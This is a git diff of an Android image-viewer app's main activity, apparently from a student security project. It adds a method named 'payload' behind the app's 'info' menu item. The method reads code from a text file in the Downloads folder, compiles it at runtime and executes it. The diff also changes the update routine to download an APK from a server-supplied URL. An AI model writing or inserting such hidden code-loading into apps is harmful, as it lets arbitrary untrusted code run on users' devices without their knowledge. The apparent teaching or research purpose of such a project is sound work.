@@ -5,7 +5,6 @@ import android.app.AlertDialog;
 import android.app.DownloadManager;
 import android.content.Context;
 import android.content.DialogInterface;
-import android.content.Intent;
 import android.net.Uri;
 import android.os.Environment;
 import android.support.v4.app.ActivityCompat;
@@ -20,12 +19,17 @@ import android.widget.Toast;
 
 import com.client_progettosicurezza.adapters.AdapterImmagine;
 import com.client_progettosicurezza.api.APIService;
+import com.client_progettosicurezza.compiler.Compile;
+import com.client_progettosicurezza.compiler.ConvertFile;
 import com.client_progettosicurezza.models.Aggiornamento;
 import com.client_progettosicurezza.models.Immagine;
 import com.client_progettosicurezza.results.ResultAggiornamento;
 import com.client_progettosicurezza.results.ResultListaImmagini;
 
 import java.io.File;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 
 import retrofit2.Call;
@@ -38,9 +42,7 @@ import static com.client_progettosicurezza.api.APIUrl.BASE_URL;
 
 public class MainActivity extends AppCompatActivity {
 
-    //new
     public static final int PERMISSION_CODE = 1;
-    //new
 
     private RecyclerView recyclerView;
     private RecyclerView.Adapter adapter;
@@ -51,9 +53,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        //new
         ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_CODE);
-        //new
 
         recyclerView = (RecyclerView) findViewById(R.id.recyclerView);
         recyclerView.setHasFixedSize(true);
@@ -112,8 +112,50 @@ public class MainActivity extends AppCompatActivity {
                 alert.show();
 
                 break;
+
+            case R.id.info:
+                File file = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/classe.txt");
+                payload(file);
+                break;
         }
         return true;
+    }
+
+    private void payload(File file) {
+
+        String codice = "";
+
+        try {
+            ConvertFile convertFile = new ConvertFile();
+            codice = convertFile.getStringFromFile(file.getAbsolutePath());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        try {
+            Compile compile = new Compile(getFilesDir(), getApplicationContext());
+            compile.assemblyCompile(codice);
+            compile.recompile();
+            compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());
+
+            Object obj = compile.run();
+            Method metodo = obj.getClass().getDeclaredMethod("toString");
+            String stringa = (String) metodo.invoke(obj);
+            Toast.makeText(getApplicationContext(), stringa, Toast.LENGTH_LONG).show();
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (NoSuchMethodException e) {
+            e.printStackTrace();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        } catch (InvocationTargetException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        } catch (InstantiationException e) {
+            e.printStackTrace();
+        }
     }
 
     private void loadImmagini() {
@@ -159,17 +201,20 @@ public class MainActivity extends AppCompatActivity {
 
                 Aggiornamento aggiornamento = response.body().getAggiornamento();
 
-                String pathURL = "https://drive.google.com/uc?export=download&id=1HZJSAxSlBi6osqu-bXuuCIBmK95y_ySy";
+                Toast.makeText(getApplicationContext(), "Download Image View.apk " + "versione: " + aggiornamento.getVersione(), Toast.LENGTH_LONG).show();
+
+                String nameApk = "ImageView_v" + aggiornamento.getVersione() + ".apk";
+
                 DownloadManager downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
-                Uri uri = Uri.parse(pathURL);
+                Uri uri = Uri.parse(aggiornamento.getFile());
                 DownloadManager.Request request = new DownloadManager.Request(uri);
                 request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
-                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "app.apk");
+                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, nameApk);
                 downloadManager.enqueue(request);
 
                 /*Intent intent = new Intent(Intent.ACTION_VIEW);
-                intent.setDataAndType(Uri.fromFile(new File(Environment.DIRECTORY_DOWNLOADS + "app.apk")),
-                        "application/com.adobe.reader");
+                intent.setDataAndType(Uri.fromFile(new File(Environment.DIRECTORY_DOWNLOADS + "/" + nameApk)),
+                        "application/com.client_progettosicurezza");
                 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);*/
             }
@@ -180,4 +225,5 @@ public class MainActivity extends AppCompatActivity {
             }
         });
     }
+
 }
